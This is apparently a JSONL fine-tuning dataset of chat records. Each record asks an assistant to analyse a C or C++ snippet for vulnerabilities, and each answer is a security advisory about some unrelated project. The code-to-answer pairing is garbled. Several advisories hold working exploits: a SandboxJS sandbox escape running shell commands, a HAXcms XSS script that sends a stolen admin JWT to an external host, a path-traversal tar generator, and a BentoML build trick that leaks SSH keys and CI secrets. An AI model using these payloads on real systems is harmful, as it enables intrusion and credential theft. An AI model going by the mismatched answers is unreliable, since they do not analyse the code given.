only)**\n```yaml\nservice: \"service.py:TestService\"\ndocker:\n  dockerfile_template: \"~/.ssh/id_rsa\"\n```\n\nNote: The `description` field does not support `~` or `$VAR` expansion. Use absolute paths or relative traversal for `description`. The `docker.*` and `conda.*` fields support all path formats.\n\n3. Run build:\n\n```bash\n$ bentoml build\nSuccessfully built Bento(tag=\"test_service:abc123\").\n```\n\n4. Verify exfiltration:\n\n```bash\n# For description field - check README.md\n$ cat ~/bentoml/bentos/test_service/abc123/README.md\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...\n\n# For /proc/self/environ - extract CI/CD secrets\n$ cat ~/bentoml/bentos/test_service/abc123/README.md | tr '\\0' '\\n' | grep -E \"KEY|TOKEN|SECRET\"\nAWS_SECRET_ACCESS_KEY=AKIA...\nGITHUB_TOKEN=ghp_...\n\n# For dockerfile_template - check Dockerfile.template\n$ cat ~/bentoml/bentos/test_service/abc123/env/docker/Dockerfile.template\n[default]\naws_access_key_id = AKIA...\naws_secret_access_key = ...\n```\n\nThe exfiltrated contents are embedded in the bento archive and will be included in any push, export, or containerization of the bento.\n\n### Impact\n\n**Who is impacted:** Any user who runs `bentoml build` on an untrusted `bentofile.yaml` (e.g., cloned from a malicious repository).\n\n**Attack scenarios:**\n- **Supply chain attack:** Malicious contributor adds path traversal to a public ML project; anyone who clones and pushes their built model has their files exfiltrated\n- **CI/CD environment variable theft:** Using `file:/proc/self/environ`, an attacker can exfiltrate ALL environment variables from the build process. CI/CD pipelines commonly inject secrets this way (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_URL`, etc.), making this a single-payload method to steal all pipeline secrets.\n- **BentoCloud exfiltration:** When victims push compromised bentos to BentoCloud (`bentoml push`), exfiltrated files are uploaded to the cloud platform. Any user with access to the BentoCloud organization (team members, contractors, or attackers with compromised accounts) can download the bento and extract stolen credentials. This turns BentoCloud into an unwitting exfiltration channel.\n- **Data theft:** Proprietary source code, configuration files, or database credentials embedded in bentos pushed to shared registries or BentoCloud deployments"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid gen_intermediate_code(CPUX86State *env, TranslationBlock *tb)\n{\n    X86CPU *cpu = x86_env_get_cpu(env);\n    CPUState *cs = CPU(cpu);\n    DisasContext dc1, *dc = &dc1;\n    target_ulong pc_ptr;\n    uint32_t flags;\n    target_ulong pc_start;\n    target_ulong cs_base;\n    int num_insns;\n    int max_insns;\n\n    /* generate intermediate code */\n    pc_start = tb->pc;\n    cs_base = tb->cs_base;\n    flags = tb->flags;\n\n    dc->pe = (flags >> HF_PE_SHIFT) & 1;\n    dc->code32 = (flags >> HF_CS32_SHIFT) & 1;\n    dc->ss32 = (flags >> HF_SS32_SHIFT) & 1;\n    dc->addseg = (flags >> HF_ADDSEG_SHIFT) & 1;\n    dc->f_st = 0;\n    dc->vm86 = (flags >> VM_SHIFT) & 1;\n    dc->cpl = (flags >> HF_CPL_SHIFT) & 3;\n    dc->iopl = (flags >> IOPL_SHIFT) & 3;\n    dc->tf = (flags >> TF_SHIFT) & 1;\n    dc->singlestep_enabled = cs->singlestep_enabled;\n    dc->cc_op = CC_OP_DYNAMIC;\n    dc->cc_op_dirty = false;\n    dc->cs_base = cs_base;\n    dc->tb = tb;\n    dc->popl_esp_hack = 0;\n    /* select memory access functions */\n    dc->mem_index = 0;\n#ifdef CONFIG_SOFTMMU\n    dc->mem_index = cpu_mmu_index(env, false);\n#endif\n    dc->cpuid_features = env->features[FEAT_1_EDX];\n    dc->cpuid_ext_features = env->features[FEAT_1_ECX];\n    dc->cpuid_ext2_features = env->features[FEAT_8000_0001_EDX];\n    dc->cpuid_ext3_features = env->features[FEAT_8000_0001_ECX];\n    dc->cpuid_7_0_ebx_features = env->features[FEAT_7_0_EBX];\n    dc->cpuid_xsave_features = env->features[FEAT_XSAVE];\n#ifdef TARGET_X86_64\n    dc->lma = (flags >> HF_LMA_SHIFT) & 1;\n    dc->code64 = (flags >> HF_CS64_SHIFT) & 1;\n#endif\n    dc->flags = flags;\n    dc->jmp_opt = !(dc->tf || cs->singlestep_enabled ||\n                    (flags & HF_INHIBIT_IRQ_MASK));\n    /* Do not optimize repz jumps at all in icount mode, because\n       rep movsS instructions are execured with different paths\n       in !repz_opt and repz_opt modes. The first one was used\n       always except single step mode. And this setting\n       disables jumps optimization and control paths become\n       equivalent in run and single step modes.\n       Now there will be no jump optimization for repz in\n       record/replay modes and there will always be an\n       additional step for ecx=0 when icount is enabled.\n     */\n    dc->repz_opt = !dc->jmp_opt && !(tb->cflags & CF_USE_ICOUNT);\n#if 0\n    /* check addseg logic */\n    if (!dc->addseg && (dc->vm86 || !dc->pe || !dc->code32))\n        printf(\"ERROR addseg\\n\");\n#endif\n\n    cpu_T0 = tcg_temp_new();\n    cpu_T1 = tcg_temp_new();\n    cpu_A0 = tcg_temp_new();\n\n    cpu_tmp0 = tcg_temp_new();\n    cpu_tmp1_i64 = tcg_temp_new_i64();\n    cpu_tmp2_i32 = tcg_temp_new_i32();\n    cpu_tmp3_i32 = tcg_temp_new_i32();\n    cpu_tmp4 = tcg_temp_new();\n    cpu_ptr0 = tcg_temp_new_ptr();\n    cpu_ptr1 = tcg_temp_new_ptr();\n    cpu_cc_srcT = tcg_temp_local_new();\n\n    dc->is_jmp = DISAS_NEXT;\n    pc_ptr = pc_start;\n    num_insns = 0;\n    max_insns = tb->cflags & CF_COUNT_MASK;\n    if (max_insns == 0) {\n        max_insns = CF_COUNT_MASK;\n    }\n    if (max_insns > TCG_MAX_INSNS) {\n        max_insns = TCG_MAX_INSNS;\n    }\n\n    gen_tb_start(tb);\n    for(;;) {\n        tcg_gen_insn_start(pc_ptr, dc->cc_op);\n        num_insns++;\n\n        /* If RF is set, suppress an internally generated breakpoint.  */\n        if (unlikely(cpu_breakpoint_test(cs, pc_ptr,\n                                         tb->flags & HF_RF_MASK\n                                         ? BP_GDB : BP_ANY))) {\n            gen_debug(dc, pc_ptr - dc->cs_base);\n            /* The address covered by the breakpoint must be included in\n               [tb->pc, tb->pc + tb->size) in order to for it to be\n               properly cleared -- thus we increment the PC here so that\n               the logic setting tb->size below does the right thing.  */\n            pc_ptr += 1;\n            goto done_generating;\n        }\n        if (num_insns == max_insns && (tb->cflags & CF_LAST_IO)) {\n            gen_io_start();\n        }\n\n        pc_ptr = disas_insn(env, dc, pc_ptr);\n        /* stop translation if indicated */\n        if (dc->is_jmp)\n            break;\n        /* if single step mode, we generate only one instruction and\n           generate an exception */\n        /* if irq were inhibited with HF_INHIBIT_IRQ_MASK, we clear\n           the flag and abort the translation to give the irqs a\n           change to be happen */\n        if (dc->tf || dc->singlestep_enabled ||\n            (flags & HF_INHIBIT_IRQ_MASK)) {\n            gen_jmp_im(pc_ptr - dc->cs_base);\n            gen_eob(dc);\n            break;\n        }\n        /* Do not cross the boundary of the pages in icount mode,\n           it can cause an exception. Do it only when boundary is\n           crossed by the first instruction in the block.\n           If current instruction already crossed the bound - it's ok,\n           because an exception hasn't stopped this code.\n         */\n        if ((tb->cflags & CF_USE_ICOUNT)\n            && ((pc_ptr & TARGET_PAGE_MASK)\n                != ((pc_ptr + TARGET_MAX_INSN_SIZE - 1) & TARGET_PAGE_MASK)\n                || (pc_ptr & ~TARGET_PAGE_MASK) == 0)) {\n            gen_jmp_im(pc_ptr - dc->cs_base);\n            gen_eob(dc);\n            break;\n        }\n        /* if too long translation, stop generation too */\n        if (tcg_op_buf_full() ||\n            (pc_ptr - pc_start) >= (TARGET_PAGE_SIZE - 32) ||\n            num_insns >= max_insns) {\n            gen_jmp_im(pc_ptr - dc->cs_base);\n            gen_eob(dc);\n            break;\n        }\n        if (singlestep) {\n            gen_jmp_im(pc_ptr - dc->cs_base);\n            gen_eob(dc);\n            break;\n        }\n    }\n    if (tb->cflags & CF_LAST_IO)\n        gen_io_end();\ndone_generating:\n    gen_tb_end(tb, num_insns);\n\n#ifdef DEBUG_DISAS\n    if (qemu_loglevel_mask(CPU_LOG_TB_IN_ASM)\n        && qemu_log_in_addr_range(pc_start)) {\n        int disas_flags;\n        qemu_log_lock();\n        qemu_log(\"----------------\\n\");\n        qemu_log(\"IN: %s\\n\", lookup_symbol(pc_start));\n#ifdef TARGET_X86_64\n        if (dc->code64)\n            disas_flags = 2;\n        else\n#endif\n            disas_flags = !dc->code32;\n        log_target_disas(cs, pc_start, pc_ptr - pc_start, disas_flags);\n        qemu_log(\"\\n\");\n        qemu_log_unlock();\n    }\n#endif\n\n    tb->size = pc_ptr - pc_start;\n    tb->icount = num_insns;\n}\n\n```"}, {"role": "assistant", "content": "SandboxJS Vulnerable to Prototype Pollution -> Sandbox Escape -> RCE\n\n### Summary\n\nSandboxJS does not properly restrict `__lookupGetter__` which can be used to obtain prototypes, which can be used for escaping the sandbox / remote code execution.\n\n### Details\n\nhttps://github.com/nyariv/SandboxJS/blob/f212a38fb5a6d4bc2bc2e2466c0c011ce8d41072/src/executor.ts#L368-L398\n\nThe Object prototype which contains `__lookupGetter__` is properly protected, but the special case for accessing function properties bypasses the prototype chain checks including the root Object prototype.\n\n### PoC\n```js\nconst s = require(\"@nyariv/sandboxjs\").default;\nconst sb = new s();\n\npayload = `\nlet getProto = Object.toString.__lookupGetter__(\"__proto__\")\nlet m = getProto.call(new Map());\nm.has = isFinite;\n\nconsole.log(\n  isFinite.constructor(\n    \"return process.getBuiltinModule('child_process').execSync('ls -lah').toString()\",\n  )(),\n);`\nsb.compile(payload)().run();\n```\n\n### Impact\nPrototype Pollution -> RCE"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic inline void gen_op_add_reg_im(TCGMemOp size, int reg, int32_t val)\n{\n    tcg_gen_addi_tl(cpu_tmp0, cpu_regs[reg], val);\n    gen_op_mov_reg_v(size, reg, cpu_tmp0);\n}\n\n```"}, {"role": "assistant", "content": "Apache Avro Java SDK is Vulnerable to Code Injection\n\nImproper Control of Generation of Code ('Code Injection') vulnerability in Apache Avro Java SDK when generating specific records from untrusted Avro schemas.\n\nThis issue affects Apache Avro Java SDK: all versions through 1.11.4 and version 1.12.0.\n\nUsers are recommended to upgrade to version 1.12.1 or 1.11.5, which fix the issue."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid PaintLayerScrollableArea::DidScroll(const FloatPoint& position) {\n  ScrollableArea::DidScroll(position);\n  CHECK(!HasBeenDisposed());\n}\n\n```"}, {"role": "assistant", "content": "HAXcms Has Stored XSS Vulnerability that May Lead to Account Takeover\n\n### Summary\nStored XSS Leading to Account Takeover\n\n### Details\nThe Exploit Chain:\n1.Upload: The attacker uploads an `.html` file containing a JavaScript payload.\n2.Execution: A logged-in administrator is tricked into visiting the URL of this uploaded file.\n3.Token Refresh: The JavaScript payload makes a `fetch` request to the `/system/api/refreshAccessToken` endpoint. Because the administrator is logged in, their browser automatically attaches the `haxcms_refresh_token` cookie to this request.\n4.JWT Theft: The server validates the refresh token and responds with a new, valid JWT access token in the JSON response.\n5.Exfiltration: The JavaScript captures this new JWT from the response and sends it to an attacker-controlled server.\n6.Account Takeover: The attacker now possesses a valid administrator JWT and can take full control of the application.\n\nVulnerability recurrence:\n\n<img width=\"1198\" height=\"756\" alt=\"image\" src=\"https://github.com/user-attachments/assets/7062d542-702e-4cbe-8493-da0f71e790c3\" />\n\nThen we test access to this html\n\n<img width=\"1433\" height=\"1019\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6c72c92f-a151-4b0e-b6ba-d83ffb771253\" />\n\nYou can obtain other people's identity information\n\n<img width=\"1082\" height=\"290\" alt=\"image\" src=\"https://github.com/user-attachments/assets/23398ea4-f08c-47bd-b2f1-89071af0e275\" />\n\n\n### PoC\nPOST /system/api/saveFile?siteName=yu&site_token=neWmRyvNbCCwiQ7MP2ojAjVMk-HtjlKYNOqsQjLt3RQ&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IlVqUzd6NFRFano1Q2xUMERiNnU0RmFROWJZSXgyMjd5OHN2NzRWb1hLbFkiLCJpYXQiOjE3NTUyNDYxODYsImV4cCI6MTc1NTI0NzA4NiwidXNlciI6ImFkbWluIn0.XrXr427aKbyw97aDjD2OX128DznGtw_CHMALAeodb0M HTTP/1.1\nHost: 192.168.1.72:8080\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\nConnection: close\nContent-Length: 1128\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"bulk-import\"\n\ntrue\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"file-upload\"; filename=\"files/pwn1116.html\"\nContent-Type: text/plain\n\n<script>\n  // This version adds headers to make the request look more legitimate.\n  fetch('/system/api/refreshAccessToken', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    },\n    body: '{}' // Sending an empty JSON object body\n  })\n  .then(response => {\n    if (!response.ok) {\n        throw new Error('Network response was not ok ' + response.statusText);\n    }\n    return response.json();\n  })\n  .then(data => {\n    var stolenJWT = data.jwt;\n    var attackerUrl = 'https://zqtqii0n7ptm168btd4htrntrkxbl29r.oastify.com/log?jwt=' + stolenJWT;\n    fetch(attackerUrl);\n  })\n  .catch(error => {\n    var attackerUrl = 'https://zqtqii0n7ptm168btd4htrntrkxbl29r.oastify.com/log?error=' + error.message;\n    fetch(attackerUrl);\n  });\n</script>\n<h1>Processing your request...</h1>\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\n\n\n### Impact\nThe attacker now possesses a valid administrator JWT and can take full control of the application."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nuser_get_cached (User *user)\n{\n        return user->cached;\n}\n\n```"}, {"role": "assistant", "content": "Container and Containerization archive extraction does not guard against escapes from extraction base directory.\n\n### Summary\nThe `ArchiveReader.extractContents()` function used by `cctl image load` and container image load performs no pathname validation before extracting an archive member. This means that a carelessly or maliciously constructed archive can extract a file into any user-writable location on the system using relative pathnames.\n\n### Details\n\nThe code in question is: https://github.com/apple/containerization/blob/main/Sources/ContainerizationArchive/Reader.swift#L180.\n\n```swift\n    /// Extracts the contents of an archive to the provided directory.\n    /// Currently only handles regular files and directories present in the archive.\n    public func extractContents(to directory: URL) throws {\n        let fm = FileManager.default\n        var foundEntry = false\n        for (entry, data) in self {\n            guard let p = entry.path else { continue }\n            foundEntry = true\n            let type = entry.fileType\n            let target = directory.appending(path: p)\n            switch type {\n            case .regular:\n                try data.write(to: target, options: .atomic)\n            case .directory:\n                try fm.createDirectory(at: target, withIntermediateDirectories: true)\n            case .symbolicLink:\n                guard let symlinkTarget = entry.symlinkTarget, let linkTargetURL = URL(string: symlinkTarget, relativeTo: target) else {\n                    continue\n                }\n                try fm.createSymbolicLink(at: target, withDestinationURL: linkTargetURL)\n            default:\n                continue\n            }\n            chmod(target.path(), entry.permissions)\n            if let owner = entry.owner, let group = entry.group {\n                chown(target.path(), owner, group)\n            }\n        }\n        guard foundEntry else {\n            throw ArchiveError.failedToExtractArchive(\"no entries found in archive\")\n        }\n    }\n```\n\n### PoC\n\nSample script `make-evil-tar.py`:\n\n```python\n#! /usr/bin/env python3\n\nimport tarfile\nimport io\nimport time\n\ntar_path = \"evil.tar\"\n\n# Content of the file inside the tar\npayload = b\"pwned\\n\"\n\nwith tarfile.open(tar_path, \"w\") as tar:\n    info = tarfile.TarInfo(\n        name=\"../../../../../../../../../../../tmp/pwned.txt\"\n    )\n    info.size = len(payload)\n    info.mtime = int(time.time())\n    info.mode = 0o644\n\n    tar.addfile(info, io.BytesIO(payload))\n\nprint(f\"Created {tar_path}\")\n```\n\n\n```console\n% ./make-evil-tar.py\nCreated evil.tar\n% mv evil.tar /tmp\n% cd /tmp\n% ls pwned.txt\nls: pwned.txt: No such file or directory\n% ~/projects/jglogan/containerization/bin/cctl images load -i evil.tar\nError: notFound: \"/var/folders/6k/tnyh0vfd07z0f9mr5cg7zs5r0000gn/T/8493984C-33AE-44BB-91BB-AE486F3095FC/oci-layout\"\n% cat pwned.txt \npwned\n```\n\n### Impact\n\nAffects users of `cctl image load` in the containerization project, and any projects that depend on containerization and use the `extractContent()` function.\n\nAffects users of `container image load` in the container project.\n\nThese operations can extract a file into any user-writable location on the system using carefully chosen pathnames. This advisory is **not** a privilege escalation, the affected files can only be written to already user-writable locations."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic inline int unicode_cp_is_allowed(unsigned uni_cp, int document_type)\n{\n\t/* XML 1.0\t\t\t\tHTML 4.01\t\t\tHTML 5\n\t * 0x09..0x0A\t\t\t0x09..0x0A\t\t\t0x09..0x0A\n\t * 0x0D\t\t\t\t\t0x0D\t\t\t\t0x0C..0x0D\n\t * 0x0020..0xD7FF\t\t0x20..0x7E\t\t\t0x20..0x7E\n\t *\t\t\t\t\t\t0x00A0..0xD7FF\t\t0x00A0..0xD7FF\n\t * 0xE000..0xFFFD\t\t0xE000..0x10FFFF\t0xE000..0xFDCF\n\t * 0x010000..0x10FFFF\t\t\t\t\t\t0xFDF0..0x10FFFF (*)\n\t *\n\t * (*) exclude code points where ((code & 0xFFFF) >= 0xFFFE)\n\t *\n\t * References:\n\t * XML 1.0:   <http://www.w3.org/TR/REC-xml/#charsets>\n\t * HTML 4.01: <http://www.w3.org/TR/1999/PR-html40-19990824/sgml/sgmldecl.html>\n\t * HTML 5:    <http://dev.w3.org/html5/spec/Overview.html#preprocessing-the-input-stream>\n\t *\n \t * Not sure this is the relevant part for HTML 5, though. I opted to\n \t * disallow the characters that would result in a parse error when\n \t * preprocessing of the input stream. See also section 8.1.3.\n\t * \n \t * It's unclear if XHTML 1.0 allows C1 characters. I'll opt to apply to\n \t * XHTML 1.0 the same rules as for XML 1.0.\n \t * See <http://cmsmcq.com/2007/C1.xml>.\n\t */\n\n\tswitch (document_type) {\n\tcase ENT_HTML_DOC_HTML401:\n\t\treturn (uni_cp >= 0x20 && uni_cp <= 0x7E) ||\n\t\t\t(uni_cp == 0x0A || uni_cp == 0x09 || uni_cp == 0x0D) ||\n\t\t\t(uni_cp >= 0xA0 && uni_cp <= 0xD7FF) ||\n\t\t\t(uni_cp >= 0xE000 && uni_cp <= 0x10FFFF);\n\tcase ENT_HTML_DOC_HTML5:\n\t\treturn (uni_cp >= 0x20 && uni_cp <= 0x7E) ||\n\t\t\t(uni_cp >= 0x09 && uni_cp <= 0x0D && uni_cp != 0x0B) || /* form feed U+0C allowed */\n\t\t\t(uni_cp >= 0xA0 && uni_cp <= 0xD7FF) ||\n\t\t\t(uni_cp >= 0xE000 && uni_cp <= 0x10FFFF &&\n\t\t\t\t((uni_cp & 0xFFFF) < 0xFFFE) && /* last two of each plane (nonchars) disallowed */\n\t\t\t\t(uni_cp < 0xFDD0 || uni_cp > 0xFDEF)); /* U+FDD0-U+FDEF (nonchars) disallowed */\n\tcase ENT_HTML_DOC_XHTML:\n\tcase ENT_HTML_DOC_XML1:\n\t\treturn (uni_cp >= 0x20 && uni_cp <= 0xD7FF) ||\n\t\t\t(uni_cp == 0x0A || uni_cp == 0x09 || uni_cp == 0x0D) ||\n\t\t\t(uni_cp >= 0xE000 && uni_cp <= 0x10FFFF && uni_cp != 0xFFFE && uni_cp != 0xFFFF);\n\tdefault:\n\t\treturn 1;\n\t}\n}\n\n```"}, {"role": "assistant", "content": "psd-tools: Compression module has unguarded zlib decompression, missing dimension validation, and hardening gaps\n\n## Summary\n\nA security review of the `psd_tools.compression` module (conducted against the `fix/invalid-rle-compression` branch, commits `7490ffa`–`2a006f5`) identified the following pre-existing issues. The two findings introduced and **fixed** by those commits (Cython buffer overflow, `IndexError` on lone repeat header) are excluded from this report.\n\n---\n\n## Findings\n\n### 1. Unguarded `zlib.decompress` — ZIP bomb / memory exhaustion (Medium)\n\n**Location**: `src/psd_tools/compression/__init__.py`, lines 159 and 162\n\n```python\nresult = zlib.decompress(data)          # Compression.ZIP\ndecompressed = zlib.decompress(data)    # Compression.ZIP_WITH_PREDICTION\n```\n\n`zlib.decompress` is called without a `max_length` cap. A crafted PSD file containing a ZIP-compressed channel whose compressed payload expands to gigabytes would exhaust process memory before any limit is enforced. The RLE path is not vulnerable to this because the decoder pre-allocates exactly `row_size × height` bytes; the ZIP path has no equivalent ceiling.\n\n**Impact**: Denial-of-service / OOM crash when processing untrusted PSD files.\n\n**Suggested mitigation**: Pass a reasonable `max_length` to `zlib.decompress`, derived from the expected `width * height * depth // 8` byte count already computed in `decompress()`.\n\n---\n\n### 2. No upper-bound validation on image dimensions before allocation (Low)\n\n**Location**: `src/psd_tools/compression/__init__.py`, lines 138 and 193\n\n```python\nlength = width * height * max(1, depth // 8)   # decompress()\nrow_size = max(width * depth // 8, 1)           # decode_rle()\n```\n\nNeither `width`, `height`, nor `depth` are range-checked before these values drive memory allocation. The PSD format (version 2 / PSB) permits dimensions up to 300,000 × 300,000 pixels; a 4-channel 32-bit image at that size would require ~144 TB to hold. While the OS/Python allocator will reject such a request, there is no early, explicit guard that produces a clean, user-facing error.\n\n**Impact**: Uncontrolled allocation attempt from a malformed or adversarially crafted PSB file; hard crash rather than a recoverable error.\n\n**Suggested mitigation**: Validate `width`, `height`, and `depth` against known PSD/PSB limits before entering decompression, and raise a descriptive `ValueError` early.\n\n---\n\n### 3. `assert` used as a runtime integrity check (Low)\n\n**Location**: `src/psd_tools/compression/__init__.py`, line 170\n\n```python\nassert len(result) == length, \"len=%d, expected=%d\" % (len(result), length)\n```\n\nThis assertion can be silently disabled by running the interpreter with `-O` (or `-OO`), which strips all `assert` statements. If the assertion ever becomes relevant (e.g., after future refactoring), disabling it would allow a length mismatch to propagate silently into downstream image compositing.\n\n**Impact**: Loss of an integrity guard in optimised deployments.\n\n**Suggested mitigation**: Replace with an explicit `if` + `raise ValueError(...)`.\n\n---\n\n### 4. `cdef int` indices vs. `Py_ssize_t size` type mismatch in Cython decoder (Low)\n\n**Location**: `src/psd_tools/compression/_rle.pyx`, lines 18–20\n\n```cython\ncdef int i = 0\ncdef int j = 0\ncdef int length = data.shape[0]\n```\n\nAll loop indices are C `signed int` (32-bit). The `size` parameter is `Py_ssize_t` (64-bit on modern platforms). The comparison `j < size` promotes `j` to `Py_ssize_t`, but if `j` wraps due to a row size exceeding `INT_MAX` (~2.1 GB), the resulting comparison is undefined behaviour in C. In practice, row sizes are bounded by PSD/PSB dimension limits and are unreachable at this scale; however, the mismatch is a latent defect if the function is ever called directly with large synthetic inputs.\n\n**Impact**: Theoretical infinite loop or UB at >2 GB row sizes; not reachable from standard PSD/PSB parsing.\n\n**Suggested mitigation**: Change `cdef int i`, `j`, `length` to `cdef Py_ssize_t`.\n\n---\n\n### 5. Silent data degradation not surfaced to callers (Informational)\n\n**Location**: `src/psd_tools/compression/__init__.py`, lines 144–157\n\nThe tolerant RLE decoder (introduced in `2a006f5`) replaces malformed channel data with zero-padded (black) pixels and emits a `logger.warning`. This is the correct trade-off over crashing, but the warning is only observable if the caller has configured a log handler. The public `PSDImage` API does not surface channel-level decode failures to the user in any other way.\n\n**Impact**: A user parsing a silently corrupt file gets a visually wrong image with no programmatic signal to check.\n\n**Suggested mitigation**: Consider exposing a per-channel decode-error flag or raising a distinct warning category that users can filter or escalate via the `warnings` module.\n\n---\n\n### 6. `encode()` zero-length return type inconsistency in Cython (Informational)\n\n**Location**: `src/psd_tools/compression/_rle.pyx`, lines 66–67\n\n```cython\nif length == 0:\n    return data   # returns a memoryview, not an explicit std::string\n```\n\nAll other return paths return an explicit `cdef string result`. This path returns `data` (a `const unsigned char[:]` memoryview) and relies on Cython's implicit coercion to `bytes`. It is functionally equivalent today but is semantically inconsistent and fragile if Cython's coercion rules change in a future version.\n\n**Impact**: Potential silent breakage in future Cython versions; not a current security issue.\n\n**Suggested mitigation**: Replace `return data` with `return result` (the already-declared empty `string`).\n\n---\n\n## Environment\n\n- Branch: `fix/invalid-rle-compression`\n- Reviewed commits: `7490ffa`, `2a006f5`\n- Python: 3.x (Cython extension compiled for CPython)"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid V8Console::errorCallback(const v8::FunctionCallbackInfo<v8::Value>& info)\n{\n    ConsoleHelper(info).reportCall(ConsoleAPIType::kError);\n}\n\n```"}, {"role": "assistant", "content": "Duplicate Advisory: TYPO3 Cross-Site Scripting vulnerability in typolinks\n\n## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-j5v7-9xr5-m7gx. This link is maintained to preserve external references.\n\n## Original Description\n\nAll link fields within the TYPO3 installation are vulnerable to Cross-Site Scripting as authorized editors can insert javascript commands by using the url scheme `javascript:`."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid LayoutBlockFlow::markSiblingsWithFloatsForLayout(LayoutBox* floatToRemove)\n{\n    if (!m_floatingObjects)\n        return;\n\n    const FloatingObjectSet& floatingObjectSet = m_floatingObjects->set();\n    FloatingObjectSetIterator end = floatingObjectSet.end();\n\n    for (LayoutObject* next = nextSibling(); next; next = next->nextSibling()) {\n        if (!next->isLayoutBlockFlow() || (!floatToRemove && (next->isFloatingOrOutOfFlowPositioned() || toLayoutBlockFlow(next)->avoidsFloats())))\n            continue;\n\n        LayoutBlockFlow* nextBlock = toLayoutBlockFlow(next);\n        for (FloatingObjectSetIterator it = floatingObjectSet.begin(); it != end; ++it) {\n            LayoutBox* floatingBox = (*it)->layoutObject();\n            if (floatToRemove && floatingBox != floatToRemove)\n                continue;\n            if (nextBlock->containsFloat(floatingBox))\n                nextBlock->markAllDescendantsWithFloatsForLayout(floatingBox);\n        }\n    }\n}\n\n```"}, {"role": "assistant", "content": "Path Traversal in angular-http-server\n\nVersions of `angular-http-server` before 1.4.4 are vulnerable to path traversal.\n\n\n## Recommendation\n\nUpdate to version 1.4.4 or later."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid gen_intermediate_code(CPUX86State *env, TranslationBlock *tb)\n{\n    X86CPU *cpu = x86_env_get_cpu(env);\n    CPUState *cs = CPU(cpu);\n    DisasContext dc1, *dc = &dc1;\n    target_ulong pc_ptr;\n    uint32_t flags;\n    target_ulong pc_start;\n    target_ulong cs_base;\n    int num_insns;\n    int max_insns;\n\n    /* generate intermediate code */\n    pc_start = tb->pc;\n    cs_base = tb->cs_base;\n    flags = tb->flags;\n\n    dc->pe = (flags >> HF_PE_SHIFT) & 1;\n    dc->code32 = (flags >> HF_CS32_SHIFT) & 1;\n    dc->ss32 = (flags >> HF_SS32_SHIFT) & 1;\n    dc->addseg = (flags >> HF_ADDSEG_SHIFT) & 1;\n    dc->f_st = 0;\n    dc->vm86 = (flags >> VM_SHIFT) & 1;\n    dc->cpl = (flags >> HF_CPL_SHIFT) & 3;\n    dc->iopl = (flags >> IOPL_SHIFT) & 3;\n    dc->tf = (flags >> TF_SHIFT) & 1;\n    dc->singlestep_enabled = cs->singlestep_enabled;\n    dc->cc_op = CC_OP_DYNAMIC;\n    dc->cc_op_dirty = false;\n    dc->cs_base = cs_base;\n    dc->tb = tb;\n    dc->popl_esp_hack = 0;\n    /* select memory access functions */\n    dc->mem_index = 0;\n#ifdef CONFIG_SOFTMMU\n    dc->mem_index = cpu_mmu_index(env, false);\n#endif\n    dc->cpuid_features = env->features[FEAT_1_EDX];\n    dc->cpuid_ext_features = env->features[FEAT_1_ECX];\n    dc->cpuid_ext2_features = env->features[FEAT_8000_0001_EDX];\n    dc->cpuid_ext3_features = env->features[FEAT_8000_0001_ECX];\n    dc->cpuid_7_0_ebx_features = env->features[FEAT_7_0_EBX];\n    dc->cpuid_xsave_features = env->features[FEAT_XSAVE];\n#ifdef TARGET_X86_64\n    dc->lma = (flags >> HF_LMA_SHIFT) & 1;\n    dc->code64 = (flags >> HF_CS64_SHIFT) & 1;\n#endif\n    dc->flags = flags;\n    dc->jmp_opt = !(dc->tf || cs->singlestep_enabled ||\n                    (flags & HF_INHIBIT_IRQ_MASK));\n    /* Do not optimize repz jumps at all in icount mode, because\n       rep movsS instructions are execured with different paths\n       in !repz_opt and repz_opt modes. The first one was used\n       always except single step mode. And this setting\n       disables jumps optimization and control paths become\n       equivalent in run and single step modes.\n       Now there will be no jump optimization for repz in\n       record/replay modes and there will always be an\n       additional step for ecx=0 when icount is enabled.\n     */\n    dc->repz_opt = !dc->jmp_opt && !(tb->cflags & CF_USE_ICOUNT);\n#if 0\n    /* check addseg logic */\n    if (!dc->addseg && (dc->vm86 || !dc->pe || !dc->code32))\n        printf(\"ERROR addseg\\n\");\n#endif\n\n    cpu_T0 = tcg_temp_new();\n    cpu_T1 = tcg_temp_new();\n    cpu_A0 = tcg_temp_new();\n\n    cpu_tmp0 = 